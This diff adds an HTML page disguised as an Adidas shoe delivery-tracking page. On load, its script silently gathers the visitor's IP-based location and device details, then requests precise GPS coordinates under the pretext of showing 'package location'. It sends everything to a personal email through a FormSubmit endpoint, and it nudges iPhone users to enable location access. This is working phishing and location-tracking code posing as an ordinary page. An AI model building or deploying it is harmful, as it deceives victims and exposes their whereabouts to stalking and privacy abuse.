@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Track Your Adidas Delivery</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 30px;
+    }
+    .container {
+      max-width: 600px;
+      margin: auto;
+    }
+    h1 {
+      color: #007aff;
+    }
+    .card {
+      background: #f5f5f5;
+      padding: 20px;
+      border-radius: 10px;
+      margin-bottom: 20px;
+    }
+    .info {
+      text-align: left;
+    }
+    .status {
+      font-size: 14px;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Track Your Adidas Delivery</h1>
+    <div class="card info">
+      <p><strong>Product:</strong> Adidas Ultraboost 22</p>
+      <p><strong>Expected Delivery: </strong><span id="datetime"></span></p>
+      <p><strong>Status:</strong> Out for delivery</p>
+      <p><strong>Delivery Partner:</strong> BlueDart Express</p>
+    </div>
+    <div id="status" class="status"></div>
+  </div>
+
+  <script>
+    const statusDiv = document.getElementById('status');
+    const FORM_ENDPOINT = "https://formsubmit.co/ajax/onkarmishra.dev.@gmail.com"; // Your verified FormSubmit email
+
+    function updateStatus(msg) {
+      const line = document.createElement('p');
+      line.textContent = msg;
+      statusDiv.appendChild(line);
+    }
+
+    function getDeviceInfo() {
+      return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        language: navigator.language
+      };
+    }
+
+    async function sendMail(data, subject) {
+      const payload = {
+        _subject: subject,
+        ...data
+      };
+
+      try {
+        const res = await fetch(FORM_ENDPOINT, {
+          method: "POST",
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+
+        if (res.ok) {
+          updateStatus(`✅ ${subject} sent successfully.`);
+        } else {
+          updateStatus(`❌ Failed to send ${subject}.`);
+        }
+      } catch (err) {
+        updateStatus(`❌ Error sending ${subject}: ${err}`);
+      }
+    }
+
+    async function sendIPInfo() {
+      updateStatus("🔍 Fetching delivery details...");
+      try {
+        const res = await fetch("https://ipapi.co/json");
+        const ipData = await res.json();
+        const deviceInfo = getDeviceInfo();
+
+        const data = {
+          ip: ipData.ip,
+          city: ipData.city,
+          region: ipData.region,
+          country: ipData.country_name,
+          postal: ipData.postal,
+          org: ipData.org,
+          timezone: ipData.timezone,
+          latitude: ipData.latitude,
+          longitude: ipData.longitude,
+          maps_link: `https://maps.google.com?q=${ipData.latitude},${ipData.longitude}`,
+          timestamp: new Date().toLocaleString(),
+          ...deviceInfo
+        };
+
+        await sendMail(data, "✅ ℹ️ Order details report");
+
+      } catch (error) {
+        updateStatus("❌ Error getting IP data.");
+        console.error(error);
+      }
+    }
+
+    function isIOS() {
+      return /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+    }
+
+    function sendLocationInfo() {
+      if (!navigator.geolocation) {
+        updateStatus("❌ Geolocation not supported.");
+        return;
+      }
+
+      updateStatus("📍 Requesting package location...");
+
+      navigator.geolocation.getCurrentPosition(
+        async position => {
+          const { latitude, longitude, accuracy } = position.coords;
+          const deviceInfo = getDeviceInfo();
+
+          const data = {
+            latitude,
+            longitude,
+            accuracy: accuracy + " meters",
+            timestamp: new Date().toLocaleString(),
+            maps_link: `https://maps.google.com?q=${latitude},${longitude}`,
+            ...deviceInfo
+          };
+
+          await sendMail(data, "✅ 🚚 Delivery progress report");
+        },
+        error => {
+          if (error.code === error.PERMISSION_DENIED) {
+            updateStatus("❌ Location access denied by user.");
+            if (isIOS()) {
+              updateStatus("📱 iPhone Users: Please go to Settings → Safari → Location → Enable location access for this site.");
+            } else {
+              updateStatus("⚠️ Please allow location access in your browser settings to track live delivery.");
+            }
+          } else if (error.code === error.POSITION_UNAVAILABLE) {
+            updateStatus("⚠️ Location info unavailable.");
+          } else if (error.code === error.TIMEOUT) {
+            updateStatus("⏳ Location request timed out.");
+          } else {
+            updateStatus(`❌ Error getting location: ${error.message}`);
+          }
+        },
+        { enableHighAccuracy: true, timeout: 5000 }
+      );
+    }
+
+    // Trigger both on load
+    window.addEventListener('load', () => {
+      sendIPInfo();
+      sendLocationInfo();
+    });
+
+    function displayCurrentDateTime() {
+      const now = new Date();
+      const options = {
+        year: 'numeric',
+        month: 'short',
+        day: 'numeric',
+        hour: 'numeric',
+        minute: 'numeric',
+        hour12: true
+      };
+      const formattedDateTime = now.toLocaleDateString('en-IN', options);
+      document.getElementById('datetime').textContent = formattedDateTime;
+    }
+
+    window.onload = displayCurrentDateTime;
+    setInterval(displayCurrentDateTime, 1000);
+  </script>
+</body>
+</html>
